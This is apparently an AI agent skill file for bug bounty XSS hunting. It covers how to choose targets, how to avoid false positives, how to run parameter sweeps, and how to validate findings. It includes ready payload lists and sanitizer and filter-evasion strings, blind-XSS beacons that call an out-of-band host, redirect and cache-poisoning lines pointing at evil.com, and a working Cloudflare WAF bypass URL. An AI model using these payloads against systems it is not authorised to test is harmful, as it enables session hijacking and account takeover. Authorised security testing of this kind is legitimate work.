---
name: hunt-xss
description: Hunting skill for xss vulnerabilities. Built from 174 public bug bounty reports. Use when hunting xss on any target.
sources: github, hackerone_public
report_count: 174
---

> **Operator's offline vault — read it first.** This user keeps an XSS knowledge base at
> `/home/user/projects/FAN/Vault/XSS/`. Execution order:
> `XSS-Testing-Agent-Playbook.md` (Phase 0 GATE → 1 map → 2 reflect → 3 context → 4 routes),
> with `DOM-Based-XSS.md` §2.1/§4 for sink enumeration, `Reflected-XSS.md` for the
> inert→executable ladder, and `Filter-Bypass-and-Encoding.md` when a WAF is in play. When the
> user says "use the vault", read the playbook before anything else and respect its gates —
> they will check that the phases were actually followed.

## Crown Jewel Targets

XSS is high-value when it combines **privileged context + persistent delivery + scope escalation**. The highest payouts come from:

- **Admin panels and authenticated dashboards** (e.g., `*/admin`, `*/settings`) — attacker can hijack sessions with elevated privileges, exfiltrate tokens, or pivot to account takeover
- **Payment/financial flows** (`paypal.com`, checkout pages, currency converters) — XSS here enables credential harvesting and financial fraud at scale
- **Stored XSS in collaborative features** (wikis, markdown renderers, issue trackers, RDoc, labels, tags) — one payload infects every viewer, multiplying impact
- **SSO/signin pages** (e.g., `paypal.com/signin`) — XSS here is critical because it can steal auth tokens across the entire platform
- **Shared SaaS tenant surfaces** (`*.myshopify.com`, `api.collabs.*`) — XSS in one tenant's context can bleed across tenant boundaries
- **Help/documentation sites** (`help.shopify.com`) — lower severity individually, but often have looser sanitization and trusted user perception
- **SVG/file upload endpoints** — frequently bypasses CSP and sanitization simultaneously

**Asset types that pay most:** Main product domains > Admin subdomains > API endpoints > Marketing/help sites

---

## OOB-Or-It-Didn't-Happen Gate (Blind / Stored XSS)

For blind and stored XSS — claims require an out-of-band confirmation, the same as blind SSRF. The OOB receiver fires when the payload actually executes in a browser somewhere (an admin reviewing logs, a SOC analyst opening a ticket, an email rendering a stored payload).

### What is NOT confirmation

- ASP.NET request validator rejected your `<` and returned a different status code → not XSS, that's WAF noise.
- Your payload appears in the response body URL-encoded or HTML-encoded → not XSS, that's correct output encoding.
- ASP.NET Request Validation returns 200 for `%3Cscript%3E` / `\u003cscript\u003e` / `&lt;script&gt;` but the sink renders them as **literal text (not decoded)** → not XSS. Validation bypassed ≠ payload executed — confirm the browser actually parses a live `<script>`/event-handler tag, not the encoded string. (Empirical: all three stored verbatim in a Webforms comment `<span>` and never fired.)
- The form action attribute contains your payload string as `%22onclick%3D…` → not XSS, the browser does NOT decode URL encoding inside HTML attribute values; the `%22` stays as literal `%22` in the DOM.
- Your `<script>` tag appears in the response as `&lt;script&gt;` → not XSS, that's escaping.
- **React/Vue SPA state-blob reflection** → not XSS. A modern SPA often serializes the URL into its state and embeds it in the served HTML as a JSON blob, e.g. `"search":"?q=<your-canary>"` or a unique marker like `ZZMARKzqx9w2k7p3ZZ` appears verbatim inside `<script>...window.__STATE__=...</script>`. This is NOT a DOM sink — the framework re-escapes that state on render, so the canary never reaches a live `innerHTML`/`document.write`. On the winticket.jp engagement this exact pattern produced a false-positive "SSTI" (`?q=7*7` → `49` in the blob) AND a false-positive "XSS" — both debunked only by (a) a unique random marker and (b) a baseline grep showing the marker's characters occur naturally elsewhere in the page. **If a param reflects ONLY inside a JSON state blob / `__NEXT_DATA__` / `window.__INITIAL_*` / `self.__next_f.push`, treat it as framework state, not a sink, until a real `innerHTML`/`eval` consumption is proven.**
  **Angular SSR variant:** Angular Universal apps embed `"ngrxState":{"router":{"state":{"url":"/home?<your-param>=<canary>"…` in the served HTML, so *every* param appears to "reflect" on *every* route. Verified on an Intershop/Angular storefront: 53 params × 6 routes → 20 marker hits, **all** at the same byte region inside `ngrxState`, 0 executions. Confirm the byte offset and the enclosing key before you call a reflection real.
  **Drupal variant:** a Drupal 10 estate produces three reflection shapes that a marker sweep scores as hits and none are XSS — `drupal-settings-json` → `"currentQuery":{"q":…}` (JSON_HEX_TAG, so `<` is emitted as `\u003C` and a `</script>` breakout is impossible *at the encoder*), the webform `action="/?q=…"` attribute (`rawurlencode`d), and the Yoast `<title>` (`esc_html`, tags stripped). Prove it by reading the raw bytes for `\u003C`, not by blaming the WAF. Where a real Drupal XSS lives, the 13-variant bypass matrix and sweep hygiene: `references/drupal-reflection-points.md`.
- **Reflection served in a non-HTML content type** → not XSS, and it is the easiest false positive to mistake for a finding because the value comes back *completely unescaped*. API/error layers that echo your input in `Content-Type: text/plain` (often with `X-Content-Type-Options: nosniff`) cannot be parsed as HTML by a browser. Prove it rather than assume: re-request with `Accept: text/html` — a **406 Not Acceptable** settles it. (Empirical: a commerce REST API returned `Bad Request (productFilter <script>alert(1)</script> is undefined.)` as `text/plain` + `nosniff`; the payload was raw, the finding was zero.) Only escalate if you can force an HTML content type or find a consumer that re-renders the value.

### What IS confirmation

- A request to your unique Collaborator subdomain (e.g., `bxss-err-<random>.<collab>.oastify.com`) arrives in the OOB listener after your payload was stored / reflected / queued.
- For stored XSS: the request arrives **hours or days later** when an admin views the affected resource. Plant payloads early in the engagement and keep the listener open.
- The User-Agent of the firing request is a browser (Mozilla/Chrome), not the server's own backend HTTP client.

### Where to plant blind-XSS beacons

Any field whose value might be viewed in an admin UI / log viewer / email / report later:
- Error messages (`?ErrorMessage=<svg onload=fetch('//bxss-<tag>.<collab>/x')>`)
- Auth-flow source params (`?Source=`, `?ReturnUrl=`)
- Login form username field (admin may view audit logs of failed logins)
- User-Agent header (some SOC consoles render UA as HTML)
- Referer header (some analytics dashboards render Referer as HTML)
- Email addresses on registration / contact forms
- File-upload filenames

**Always sub-tag the Collaborator subdomain by sink** so callbacks identify which field fired.

**Lesson from a authorized engagement:** 10 blind-XSS Collaborator beacons planted across `ErrorMessage`, `Source`, the Authentication.asmx username field, User-Agent header, Referer header, and request paths. Zero callbacks over a 10-minute polling window. Conclusion: the SharePoint SOC views logs / errors in tooling that does not render HTML, AND the ASP.NET request validator blocks `<` in query strings before the payload reaches storage. Stored-XSS claim correctly retracted.

---

## ASP.NET WebForms / Request Validation — Exhaustive Non-Exploitability Proof

When a `.aspx` form renders user comment text with **no HTML output encoding** (sink like
`<span id="Repeater1_Label3_1">USERINPUT</span>` shows raw submission), it *looks* XSS-able.
But ASP.NET **Request Validation** (`validateRequest`, 4.x default on) is a hard submission gate:

- Any literal `<` or `>` in **any** POST field → HTTP 500 (`potentially dangerous Request.Form value`). Blocks **all** raw tags: `<script>`, `<h1>`, `<img onerror>`, `<svg>`, attribute breakouts — not just `<script>`.
- Only **encoded** forms slip through and return 200: `%3C`/`%3E`, `&lt;`/`&gt;`, `\u003c`/`\u003e`, `+ADw-` (UTF-7), `%C0%BC` (overlong UTF-8), `\152` octal JS. These get **stored**.
- **Critical mechanic:** the server stores the encoded string **verbatim** — there is NO decode step on save or render. The sink emits `&lt;script&gt;` as literal text; the browser never parses a live tag. *Bypassing validation ≠ achieving XSS.* This is the single most common false-positive on legacy WebForms apps.

**Definitive proof methodology** (reusable; full detail + Python skeleton in `references/aspx_webforms_request_validation.md`):
1. POST an encoding matrix (raw, HTML-entity, URL 1/2/3×, JS-unicode, UTF-7, overlong, octal); record 200 vs 500.
2. Re-GET the comment page across **all** paginated pages (`__EVENTTARGET=rptPaging$ctlNN$btnPage`); scan the sink for a **REAL** tag — a `<` followed by a tag name that is NOT prefixed by `&lt;`, `%3C`, `\u`, or `\x`.
3. **Detector self-inflation trap (the bug I actually hit):** a verifier that greps the sink for `alert` / `onerror` / `onload` / `javascript:` / `<script` will **flag inert strings as "executable"** — e.g. `[a](javascript:window.onerror=alert;throw%201)`, octal `\152\141...alert(1)`, or `var contentType = 1; alert(1);`. None contain a parseable tag. Require the REAL `<tag>` form above. My first scanner printed "EXPLOITABLE / 8 hits" from exactly this; a strict re-scan returned 0. Correct the detector, never the verdict.
4. 0 real tags across all encodings + all pages → **NOT exploitable via this form**.
5. **Secondary-sink dir-bust:** brute `/admin.aspx`, `/viewcomments.aspx`, `/api/comment`, `*.asmx`, `*.ashx`, `/trace.axd`. Legacy WebForms often has a hidden admin/export page rendering the same store *without* validation — that's where missing output encoding bites. Clean dir-bust = informational only.
6. `/trace.axd` → 403 = ASP.NET tracing enabled (info-disclosure finding if reachable). Log separately; not XSS.

**Arsenal collection (portable bank):** `curl` the PortSwigger cheat sheet + sitemap.xml (full lab taxonomy), plus GitHub `PayloadsAllTheThings/XSS-injection`, `payloadbox/xss-payload-list`, OWASP `xss-filter-evasion-cheatsheet`. Categorize by context; reuse on properly vulnerable targets.

**Legacy tell:** client-side validator using `document.all ? document.all[...] : getElementById(...)` = legacy ASP.NET (2.0/3.5 or xhtmlConformance=Legacy). Validators are client-side only (bypassable via direct POST); the real gate is server-side `validateRequest`.

## Attack Surface Signals

**URL Patterns:**
```
/admin*
/settings*
/wiki*
/reports*
?utm_source=
?redirect=
?q=
?search=
?callback=
?return_url=
/render*
/preview*
/documentation*
```

**Response Headers (weak defense signals):**
```
Content-Type: text/html (without nosniff)
Content-Security-Policy: (absent or using unsafe-inline)
Content-Type: image/svg+xml (CSP often not applied)
X-XSS-Protection: 0
```

**JS Patterns in source that signal DOM XSS:**
```javascript
document.write(
innerHTML =
location.hash
location.search
location.href
document.referrer
eval(
setTimeout(string,
setInterval(string,
$.html(
$(location
```

**Tech Stack Signals:**
- Rails applications using `html_safe`, `raw`, `translate`, Action Text, or ActionView sanitize helpers
- GitLab/GitHub markdown pipelines (Banzai, Kramdown, RDoc, Kroki)
- Applications allowing SVG uploads or rendering
- Sites using `style` tag in allowlists
- Kroki/Mermaid/PlantUML diagram rendering endpoints
- Cache layers in front of authenticated pages (cache poisoning vector)

---

## Step-by-Step Hunting Methodology

1. **Map all reflection points** — Spider the target and identify every place user input appears in HTML output. Prioritize: URL parameters, form fields, HTTP headers (User-Agent, Referer), file upload names/contents, and API response fields rendered in UI.

2. **Classify by type** — Determine if each reflection is Reflected (URL param → response), Stored (database → later rendering), or DOM-based (JS reads URL/storage → DOM sink). Each requires different payload delivery.

3. **Probe sanitizer behavior** — Send harmless canary strings first: `aaa"bbb'ccc<ddd` to determine which characters are escaped. Observe if output is in HTML context, attribute context, JS context, or URL context.

   **Marker Discipline:** When choosing canary strings, they MUST be unique random alphanumeric strings (8+ chars, no English words, no protocol keywords). Bad markers: `test`, `marker`, `evil`, `attacker`, `payload`, `javascript`, `script`. Good markers: `cpmark987abc`, `x4hd2k9pq`, `__ZZ_MARKER_<random>_ZZ__`.
   **The marker must be a literal PREFIX (substring) of what you actually send.** If your canary is
   `MARKER + '"<>/` and you grep for `MARKER`, fine. If you instead build the canary as
   `H1X"tag1234'<>/` while searching for `H1Xtag1234`, the inserted quote breaks the match and a
   *real* reflection is recorded as "no reflection" — a silent false negative that makes your
   whole sweep look clean. Rule: construct `canary = marker + hostile_suffix`, never interleave
   characters into the marker itself, and unit-test the detector on a one-shot request before
   looping (send the canary to a known-reflecting endpoint, assert the marker is found). **Common False-Positive Patterns (confirmed against real targets):**
- JSON-LD metadata in `<script type="application/ld+json">` blocks — the payload appears escaped as `&lt;script&gt;` in the HTML title but the JSON-LD contains unescaped data. Check actual DOM rendering, not just raw reflection.
- React/Vue SPA state blobs (`window.__INITIAL_STATE__` or JSON-LD with `"author":{"name":"..."}`) — the payload may be in the page source inside a JavaScript string context. If it's only in the JSON-LD metadata (not rendered as HTML), it's NOT XSS.
- **Analytics / ad-tech pixels echoing the full URL** — the most convincing false positive a headless-browser harness produces. VWO, AdRoll, Facebook, GTM and friends write the entire current URL (query + fragment) into tracking-pixel `src` attributes, URL-encoded. A detector that greps the dumped DOM for your marker therefore reports "EXECUTED" on a page that did nothing. Verified on charts.trendspider.com: the marker appeared 4× in the serialized DOM, every occurrence inside `dev.visualwebsiteoptimizer.com/j.php?...&u=https%3A%2F%2F...` or `d.adroll.com/cm/...&arrfrr=...`, with `document.title` unchanged. Rule: a DOM-XSS verdict needs (a) `document.title` changed, (b) a real node your payload created (`id="xssmark987"`), or (c) an OOB callback. A marker substring anywhere in `outerHTML` proves nothing — trackers copy the URL into the page.
- **Payload text echoed into `<title>` by a search template — the trap that defeats signal (a) above.** WordPress search on the same target renders `?s={{constructor.constructor("document.title='XSSMRK'")()}}` as `<title>{{constructor.constructor("document.title='XSSMRK'")()}}  | Blog</title>`. The marker IS in `document.title`, so a check written as *"marker appears in title"* reports EXECUTED — while nothing ran (the page is WordPress, not Angular; no template compiler ever touched it). Two of these fired in one pass and had to be retracted. Fix the assertion, not the payload: a hit requires the title to **equal the bare marker** (`title.strip() == "XSSMRK_dq"`), not to contain it. Same strictness for the node check: require the exact `id="xssmark987"` attribute, never a substring of `outerHTML`. When a run reports hits, always print the surrounding title/DOM context and re-test the flagged URLs with the equality assertion before writing anything down.

4. **Test allowlisted tag combinations** — If a sanitizer is in use, probe for dangerous tag combos: `<math>+<style>`, `<svg>+<style>`, `<iframe srcdoc>`, `<style>` with expressions.

5. **Hunt SVG and file upload vectors** — Upload SVG files containing `<script>` tags. Check Content-Type response header. Test if CSP applies to SVG responses separately.

6. **Test markdown/documentation renderers** — In wiki, README, or doc fields, try: `[text](javascript:alert(1))`, inline HTML injection, Kroki/Mermaid payloads, RDoc `link:javascript:` syntax.

7. **Check redirect parameters** — Test `?redirect=javascript:alert(1)` and `?return_url=//evil.com` — look for single-click XSS via improper redirect sanitization.

8. **Probe UTM and analytics parameters** — `utm_source`, `utm_medium`, `utm_campaign` are often reflected without sanitization on marketing pages.

9. **Test CSP bypass opportunities** — If CSP is present, look for: JSONP endpoints on allowed domains, `unsafe-inline` in style-src, SVG that bypasses script-src, script gadgets on whitelisted CDNs.

10. **Attempt stored XSS in profile/metadata fields** — Username, bio, tag names, label colors, organization names — these render in many contexts and often have weaker validation.

11. **Check cache poisoning** — Test if reflected XSS payloads can be cached and served to other users (especially on CDN-fronted pages), transforming reflected XSS into stored-equivalent.

12. **Validate in target browser** — Always confirm in a real browser before reporting. Many payloads echo back in Burp but fail to execute in a real browser due to CSP, output encoding, framework auto-escaping, context mismatch, WAF normalization, or browser HTML-parsing differences. (Note: Chrome's XSS Auditor was removed in Chrome 78 / Oct 2019 and no shipping browser has one — never attribute a failed PoC to an "XSS auditor".)

   For SPAs, run the matrix rather than eyeballing one URL: `scripts/spa_param_xss_matrix.py`
   drives an isolated Firefox+Marionette instance over `routes × params`, and scores each load on
   three independent signals — payload present **raw** in `documentElement.outerHTML`, the
   execution canary `window.__XSS`, and a real `img[src=x]` node in the DOM. That triple check is
   what separates "reflected but escaped" (not a bug) from "framework state blob" (not a bug) from
   an actual execution. A 0-hit run over ~180 combinations is a *publishable negative*; a
   reflection grep is not. Budget the run (see `recon-pitfalls` §11 — a long matrix can flip a
   CDN from challenge to hard block mid-run) and test the highest-value params first.

---

## Exhaustive Sweep → Emission-Form Classification (the publishable-negative pipeline)

When the ask is "test every parameter, leave nothing out", the deliverable is not a
reflection grep — it is a **classification of how each reflected parameter is emitted**.
Reflection alone is meaningless; the emission form is the verdict.

**Step 1 — harvest params, do not guess them.** For each live page, parse the HTML and pull
every query key from `<a href>`, `<link href>`, `<script src>`, `<form action>`, plus every
`name=` on `input/select/textarea`, then union with keys from the archived URL corpus
(`gau`/`wayback`). Drop WP internals (`ver`, `nonce`, `_wp*`). This routinely finds keys you
would never invent — on trendspider.com the marketing pages carried `_go`, `reason`,
`retitle_to`, `use_case`, `sourceid`, `hl`, `oq`, `gs_lcrp`, `see-all`; `/tv/` carried form
field names (`email`, `first_name`, `last_name`, `form_id`, `pitlist`). 19 pages → 135 params.

**Step 2 — marker pass.** Inject one unique marker per (page, param), record every page where
it comes back, body or header (`Set-Cookie`, `Location`). Keep the surrounding ±90 chars as
context — that is what tells you whether you are in a `href`, a `<title>`, an attribute, or a
JS string. Note the "write-into-cookie" pattern too: `?_go=<val>` set
`Set-Cookie: _trendspider_sale_tag=<urlencoded val>`; the cookie was never reflected back, so
it stayed a non-finding, but you must check or you cannot say so.

**Step 3 — emission-form classification (the step everyone skips).** Re-inject a hostile
payload (`cpmarkx"><b>zq`) into every reflective param and classify the exact bytes that come
back:

| Class | Observed | Verdict |
|---|---|---|
| `URLENC` | `cpmarkx%22%3E%3Cb%3Ezq` | safe in HTML text/attr; only interesting if that value lands in a JS sink or an unquoted URL context |
| `ENTITY` | `cpmarkx&quot;&gt;&lt;b&gt;zq` | safe |
| `NUMENT` | `cpmarkx&#34;&#62;&#60;b&#62;zq` | safe |
| `RAWQ` | quote survives, tags encoded (`cpmarkx"` + `&lt;`) | **attribute-context breakout candidate** — quote closes a quoted attribute. Verify the attribute's own quoting before calling it a bug |
| `RAW` | `cpmarkx"><b>zq` verbatim | **exploitable — prove execution** |
| `STRIPPED` | marker present, hostile chars gone | filter, not encoding — test bypass variants |

Expect a large URLENC population: canonical/`og:url`/JSON-LD `"url"` fields percent-encode the
whole URL, so *every* param "reflects" there. That is why 135 params yielded 70 reflections but
**0 RAW breakouts** on trendspider.com — the negative only becomes publishable once you have
counted by class rather than by presence.

**Step 4 — read the JavaScript, not just the responses.** Reflection is only half the bug.
Grep the live bundles for `innerHTML`, `insertAdjacentHTML`, `dangerouslySetInnerHTML`,
`x-html`, `ng-bind-html`, `$sce.trustAsHtml`, `document.write`, `eval`, `location.hash/search`,
`postMessage` — then trace each sink **to its data source**. A sink fed by server-rendered
markup or DB content is a latent hardening issue, not a finding; a sink fed by an
attacker-writable field is the bug. Worked sink map, per-stack review checklist and the
latent-vs-exploitable criteria: `references/sink-vs-source-audit.md`.

**Tooling:** `scripts/xss_param_sweep.py` does steps 1–3 in one run
(`python3 xss_param_sweep.py pages.txt`), writing `xss_sweep.json` with per-param class +
context so the negative is auditable later. For execution proof without Firefox/Marionette,
`scripts/dom_xss_dumpdom.py targets.txt` drives headless Chrome `--dump-dom` and counts a hit
only when `document.title` **equals** the bare marker or the payload-owned node id exists —
the strict assertion that kills the tracker-pixel and title-echo false positives.

### Corpus-scale sweep — when the ask is "every URL, every parameter"

A page-sampled sweep (19 pages → 135 params) is a **sample**, not coverage, and the operator
will call it out: *"did you first collect urls then test for every parameter for reflection,
then test xss? for each urls?"* If the deliverable is a publishable negative, drive it off the
URL corpus, not off the pages you happened to open.

**Precondition — the corpus is only as wide as the host list.** A sweep is bounded by the
assets you feed it, so re-enumerate the subdomain space first (see
`targeted-subdomain-recon` §2.1b–2.1d) instead of inheriting a previous session's host list.
On the 2026 engagement that produced these numbers, passive sources returned 30 names; a
wordlist brute plus sibling-domain enumeration surfaced a staging estate that had never been
in the prior session's notes — and therefore had never been in any sweep. Parameters on
un-enumerated hosts are invisible, so "0 breakouts" over an incomplete host list is a false
negative dressed as a result. Confirm host coverage before you trust the param coverage.

```
gau + 2× katana crawls  →  dedupe/filter  →  endpoint→param map  →  reflection per pair
                        →  emission class per reflection  →  DOM proof on survivors
```

Measured on trendspider.com (2026-10): 5,016 unique query URLs → 891 endpoints → **1,757
endpoint+param pairs** → 2,690 requests (after retry) → 325 reflections → 0 RAW breakouts.
That shape — thousands of pairs, hundreds of reflections, a large URLENC population, zero RAW
— is what a real "no XSS here" claim looks like. Two failure modes decide whether the run is
evidence or noise:

1. **Throttle/captcha contamination fakes reflections.** High concurrency flipped the estate
   into `503`, then into `202` SiteGround captcha pages whose body echoes the full request URL
   (`/.well-known/sgcaptcha/?r=%2Fpricing%2F...`). A naive "marker in body" detector counts
   those as reflections. Filter **before** counting: drop status `202`, `503`, `0`, and any
   response carrying `sg-captcha: challenge`, then retry the dropped set at 3–5 threads with
   exponential backoff. Anything that survives is a real reflection.
2. **`NO-ECHO` is not `SAFE`.** A param that reflected a plain marker but not the hostile
   payload has either been dropped or been filtered. Resolve it with an incremental probe —
   `cpmarkx`, `cpmarkx"`, `cpmarkx<`, `cpmarkx'`, `cpmarkx%22%3E` — and record which character
   stops the echo. Zero echo on plain `cpmarkx` means it is not reflective in the current
   state (usually captcha/cache residue from the earlier pass); do not write it down as
   "encoded".

Keep one JSONL per stage (`reflection_results`, `encoding_results`) so the negative is
auditable and re-runnable. `scripts/corpus_param_sweep.py urls.txt` runs stages 1–3 over a
whole corpus with the contamination filter and the `NO-ECHO` resolution built in. Full
pipeline, scripts and the trendspider numbers: `references/url-corpus-sweep.md`.

### Stored XSS is a different sweep — and "untested" is not "clean"

Reflected/DOM coverage says nothing about stored. Before claiming a clean stored-XSS pass,
establish whether you can even reach a write path: every unauth write surface is captcha-gated
or paid on modern SaaS, and the authenticated bundle may be unreachable statically (302 to
/login, no `ngsw.json`, CDN 403 on unknown keys, no wayback snapshot). Probe the gates
explicitly rather than assuming, then state the limitation in the report. Gate-probing recipe
(signup GraphQL enum discovery, recaptcha-enforcement test, disposable-email filter,
paid-trial plans) and the reporting wording: `references/stored-xss-access-gating.md`.

---

## Payload & Detection Patterns

**Basic context probing:**
```html
aaa"bbb'ccc<ddd>eee`fff
```

**Reflected XSS — URL parameter baseline:**
```
?q=<script>alert(document.domain)</script>
?q="><script>alert(1)</script>
?utm_source=<svg onload=alert(1)>
?redirect=javascript:alert(document.domain)
```

**Attribute context escapes:**
```html
" onmouseover="alert(1)
' onmouseover='alert(1)
`onmouseover=alert(1)
```

**SVG-based (CSP bypass):**
```html
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>
```

**Sanitizer bypass — math+style combo:**
```html
<math><style><img src=x onerror=alert(1)></style></math>
```

**Sanitizer bypass — svg+style combo:**
```html
<svg><style><img src=x onerror=alert(1)></style></svg>
```

**Markdown/RDoc javascript: link:**
```markdown
[Click me](javascript:alert(document.domain))
```

**Kroki/diagram injection:**
```
```kroki
plantuml
@startuml
:<script>alert(1)</script>;
@enduml
```
```

**DOM XSS via hash/search:**
```javascript
// In browser console to test sink
location.hash = '#"><img src=x onerror=alert(1)>'
location.href = 'https://target.com/page#<script>alert(1)</script>'
```

**Grep patterns for source review:**
```bash
# Find dangerous sinks in JS
grep -rn "innerHTML\|document\.write\|eval(\|setTimeout(\|location\.hash\|location\.search" --include="*.js"

# Find unsafe Rails helpers
grep -rn "html_safe\|raw(\|sanitize\|translate" --include="*.erb" --include="*.rb"

# Find reflected params in responses
grep -i "utm_source\|utm_medium\|redirect\|return_url\|callback\|next" --include="*.html" -r
```

**Curl to detect reflection:**
```bash
curl -sk "https://target.com/search?q=XSSCANARY" | grep -i "XSSCANARY"
curl -sk "https://target.com/page?utm_source=XSSCANARY" | grep -i "XSSCANARY"
```

**Cache poisoning test:**
```bash
# Send payload then fetch with clean session to see if cached
curl -sk "https://target.com/page?param=<script>alert(1)</script>" -H "X-Forwarded-Host: evil.com"
curl -sk "https://target.com/page" | grep -i "evil.com"
```

---

## Common Root Causes

1. **Trusting `html_safe` in Rails** — Developers mark strings as safe after partial sanitization, or chain `.html_safe` on user-supplied data without full sanitization.

2. **Allowlist sanitizers with dangerous tag combinations** — Allowing `style` alongside `math` or `svg` creates mXSS (mutation XSS) opportunities even when individual tags seem harmless.

3. **Third-party rendering pipelines** — Markdown-to-HTML pipelines (Banzai, Kramdown, Kroki) introduce XSS when diagram/rendering engines aren't sandboxed and output isn't re-sanitized.

4. **Reflecting URL parameters without encoding** — UTM params, redirect URLs, and search terms are reflected in page HTML or JS without proper HTML-encoding, especially on marketing/help pages that are treated as lower-security.

5. **SVG treated as non-script content** — Developers apply CSP to HTML responses but forget that `image/svg+xml` responses can execute JavaScript and often aren't covered by the same CSP header.

6. **Incomplete sanitizer patches** — CVE-patched sanitizers are bypassed by slight variations (e.g., CVE-2022-32209's incomplete fix demonstrates that sanitizer logic is difficult to get right, creating bypass chains).

7. **`javascript:` scheme not blocked in href/src** — Link renderers (RDoc, Markdown) fail to block `javascript:` URLs in href attributes, treating them as valid external links.

8. **Cache layers storing authenticated user input** — CDN or reverse proxy caches store responses containing user-controlled XSS payloads, serving them to subsequent unauthenticated users.

9. **File upload without Content-Type enforcement** — Accepting SVG or HTML files and serving them without forcing `Content-Disposition: attachment` or overriding Content-Type.

10. **Translation helper XSS** — Rails `translate`/`t()` helper marks translation strings as HTML-safe and interpolates user input, enabling injection through locale keys.

---

## Bypass Techniques

**CSP Bypass:**
- SVG uploads bypass script-src because `image/svg+xml` responses may not inherit the page's CSP
- Find JSONP endpoints on whitelisted domains (`*.googleapis.com`, `*.cloudflare.com`)
- Use `<base>` tag injection to redirect script sources
- Exploit `unsafe-eval` or `unsafe-inline` in style-src to execute CSS-based attacks
- `<link rel=preload>` or `<meta http-equiv>` gadgets to bypass strict policies

**Sanitizer Bypasses:**
- **mXSS (Mutation XSS):** Inject HTML that's safe when parsed by sanitizer but mutates when re-parsed by browser (e.g., `<math><style><img onerror=...>`)
- **Tag combination attacks:** `<svg>` + `<style>` or `<math>` + `<style>` create parsing ambiguity
- **Attribute quoting variations:** `onmouseover=alert(1)` without quotes, backtick delimiters
- **HTML entity encoding:** `&#106;avascript:` or `&#x6A;avascript:` in href values
- **Protocol variations:** `javascript:`, `vbscript:`, `data:text/html`

**Filter Evasion:**
```html
<!-- Case variation -->
<ScRiPt>alert(1)</ScRiPt>
<!-- Null bytes (legacy/weak — null bytes rarely survive modern HTTP/HTML parsing; low success, don't rely on it) -->
<scr\x00ipt>alert(1)</scr\x00ipt>
<!-- Tag breaking -->
<svg/onload=alert(1)>
<!-- Event handler alternatives -->
<body onpageshow=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
```

**When a reflection is encoded — run the ladder, don't just write "escaped"**

Operator expectation (stated explicitly): *"in xss you have to try to bypass it if it is reflected."*
A reflection that comes back encoded is not the end of the test — it is the start of the bypass test.
For every reflecting parameter, send the ladder and classify the bytes that come back:

```
raw "            &#34;        &#x22;      %2522 (double-encode)   \"      ＂ (fullwidth)
</title>         </TITLE>     </script>   </script/>   </script >   ]]>   <!-->
```

Pass criterion: the dangerous character survives **unencoded in that specific output context**
(quote inside a quoted attribute, `<` inside markup/RCDATA, `%22` decoded into an attribute by a
later template step). Anything else is a safe encoder, not a near-miss.

Two rules that decide whether the verdict is credible:
1. **An encoder proof outranks a WAF proof.** `\u003C` in a JSON blob and `%22` in an attribute are
   server-side facts that hold even if the payload reaches origin. Reporting "the WAF blocked it"
   when the encoder is actually correct invites a triage rebuttal ("bypass the WAF, then").
2. **Name the encoder per context** in the writeup: attribute → `rawurlencode`/`esc_attr`,
   RCDATA/`<title>` → `esc_html`, JSON/`<script type=application/json>` → JSON_HEX_TAG,
   text node → `strip_tags`. "All escaped" is not a finding description; the mapping is.

When every point maps to the correct encoder there is no mismatch to exploit — say that plainly,
with the measured matrix as evidence, instead of hand-waving a negative.

**WAF Bypass:**
```javascript
// Obfuscated payloads
<svg onload=eval(atob('YWxlcnQoMSk='))>
// String splitting
<script>ale\u0072t(1)</script>
// HTML5 event handlers that WAFs miss
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
```

**Redirect-based XSS bypass:**
```
?next=javascript://%0aalert(1)
?next=javascript&colon;alert(1)
?redirect=//evil.com/%0d%0a%0d%0a<script>alert(1)</script>
```

---

## CDN/WAF in Front of a DOM Sink — Characterise, Then Bypass

A DOM sink is **not** unreachable because the edge 403s your payload. The WAF normalises the
request; the browser does not. Map what the filter actually blocks with a payload ladder, then
pick a primitive that survives normalisation but still parses.

Measured Cloudflare behaviour (2026, `?token=` → `document.getElementById(...).innerHTML = token`):

| probe | edge |
|---|---|
| `<img src=x>`, `<b>(</b>`, `<b>a(1)</b>` (no handler) | pass |
| `onerror=alert(1)` / `onerror=a(1)` / `onerror=(1)` | 403 |
| `&#40;`, `&#x28;`, `&#000028;`, `&lpar;…&rpar;` | 403 — **entities are normalised before matching** |
| `alert\`1\`` (tagged template) | 403 |
| `javascript:` incl. tab/newline inside the scheme | 403 |
| `throw 1`, `window.`, `document.` | 403 |
| `onerror=alert` (bare ref), `onerror=self.__XSS=1` | pass — **JS executes** |
| `onerror=alert\t(1)` / `alert\f(1)` | 403 |
| **`onerror="alert\n(1)"`** | **pass — and executes** |

**Working bypass — newline between callee and `(`:**
```
https://target/Verify/index.html?token=%3Cimg%20src%3Dx%20onerror%3D%22alert%0A%281%29%22%3E
```
Two requirements, both easy to miss:
1. A real LF (`%0A`) between the function name and `(`. The WAF regex does not cross the line
   break; JS does — `alert\n(1)` parses as `alert(1)`. LF and CRLF pass; tab and form-feed are
   blocked.
2. The attribute **must be quoted**. Unquoted, the HTML parser ends the value at the newline and
   you get `onerror="alert"` plus a junk `(1)` attribute → no execution. That failure mode looks
   exactly like "the bypass didn't work", so read the sink HTML before iterating on payloads.

**Paren-free fallback when every call syntax is filtered:** bind the error handler and let the
browser call it for you —
`onerror=self.onerror=alert;self.x.y` → the uncaught TypeError invokes `window.onerror` (= alert)
→ dialog with the error text. Proves execution, but you don't control the argument.

**Confirm from the dialog, not the response.** Grepping the body proves nothing for a DOM sink —
the payload never reaches the server. Capture the real alert via Marionette
`switch_to_alert()` / `.text` (see `browser-isolation`); the dialog text is the evidence.
Full ladder + reproduction: `references/cdn-waf-dom-sink-bypass.md`.

---

## Gate 0 Validation

Before writing the report, answer all three:

1. **What can the attacker DO right now?**
   The attacker must demonstrate a concrete action: execute JavaScript in victim's browser session on the target domain, steal session cookies/tokens, perform actions as the victim, or exfiltrate sensitive data. "Alert box appears" is not sufficient — state what the alert box *represents* in terms of access (e.g., "I can read `document.cookie` which contains the auth token used for all admin API calls").

2. **What does the victim LOSE?**
   The victim must lose something real: session control (account takeover), sensitive data (cookies, CSRF tokens, PII), money (financial action performed without consent), or trust (credential phishing via DOM manipulation). If the victim is an unauthenticated user on a public page with no session, quantify what *that* user's browser is exposed to.

3. **Can it be reproduced in 10 minutes from scratch?**
